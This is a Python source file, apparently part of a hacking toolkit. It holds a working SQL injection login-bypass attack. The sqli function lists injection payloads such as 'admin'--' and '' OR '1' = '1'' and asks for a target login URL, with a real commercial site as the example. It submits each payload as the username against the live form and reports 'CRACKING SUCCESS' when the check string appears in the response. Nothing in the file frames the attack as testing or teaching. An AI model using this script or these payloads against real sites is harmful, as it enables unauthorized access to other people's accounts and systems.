import socket
import os
import struct
from scapy.all import*
import string
import random
import urllib.request
from time import time
import asyncio
import aiohttp
import requests
import copy
from bs4 import BeautifulSoup, SoupStrainer
from functools import partial
import sys
from urllib.request import build_opener, HTTPCookieProcessor
import http.cookiejar as cookielib
from html.parser import HTMLParser
from urllib.parse import urlencode
import errno
import time
from urllib.parse import urlparse
from pythonping import ping
import base64
from datetime import date
from utils.display import delay_print

def sqli():
	sqlcodes = [\
	'\'', \
	'*;--', \
	'*#', \
	'*', \
	'--', \
	'/*', \
	'"', \
	"\\", \
	"')", \
	"';", \
	'"', \
	'")', \
	'";', \
	"`", \
	"`)", \
	"`;", \
	"\\", \
	"%27", \
	"%%2727", \
	"%25%27", \
	"%60", \
	"%5C", \
	'\' OR \'1\' = \'1\'',\
	'\' OR \'1\' = \'1\'#', \
	'admin\'--', \
	'admin;--', \
	'admin\';--', \
	'admin\'#', \
	'admin;#', \
	'admin\' OR \'1\' = \'1\';--', \
	'admin\' OR \'1\' = \'1\';#', \
	'admin\' OR \'1\' = \'1\'#', \
	'admin\' OR \'1\' = \'1\'--', \
	'\' OR \'1\' = \'1\';--', \
	'\' OR \'1\' = \'1\'#', \
	'\' OR \'1\' = \'1\';#']

	targeturl = input('Url like[https://ec.cafe24.com/] : ')
	targetpost = input('Post like[https://eclogin.cafe24.com/Shop/] : ')
	print("="*50)
	username_field = 'admin'
	pass_field = 'pwd'
	check = 'update'

	class myHTMLParser(HTMLParser):
		def __init__(self):
			HTMLParser.__init__(self)
			self.tagResult = {}
			
		def handle_starttag(self, tag, attrs):
			if tag == 'input':
				tagname = None
				tagvalue = None
				for name, value in attrs:
					if name == 'name':
						tagname = value
					if name == 'value':
						tagvalue = value
					
				if tagname is not None:
					self.tagResult[tagname] = tagvalue		


	def webAuthCracker(username):
		try:
			password = ''
			cookies = cookielib.FileCookieJar('cookies')
			opener = build_opener(HTTPCookieProcessor(cookies))
			res = opener.open(targeturl)
			htmlpage = res.read().decode()
		
		
			parseR = myHTMLParser()
			parseR.feed(htmlpage)		

			inputtags = parseR.tagResult
			inputtags[username_field] = username
			inputtags[pass_field] = password
		
			loginData = urlencode(inputtags).encode('utf-8')
			loginRes = opener.open(targetpost, data=loginData)
			loginResult = loginRes.read().decode()

			if check in loginResult:#혹시몰라 만듬.이걸 오류로 생각하고 만들었는데;;
				print('\n---CRACKING SUCCESS!')
				print('---SQL INJECTION [%s]' %username)			
		except Exception as ex:#이게 ㄹㅇ오류인듯
			print(f"[!] [{username}]")
			print()
			pass

	def main():
		print('[+] SQL INJECTION START...')
		print('[+] Trying Somethon...')
		for sqlcode in sqlcodes:
			webAuthCracker(sqlcode)	
		
	if __name__ == '__main__':
		main()
				
	print("="*50)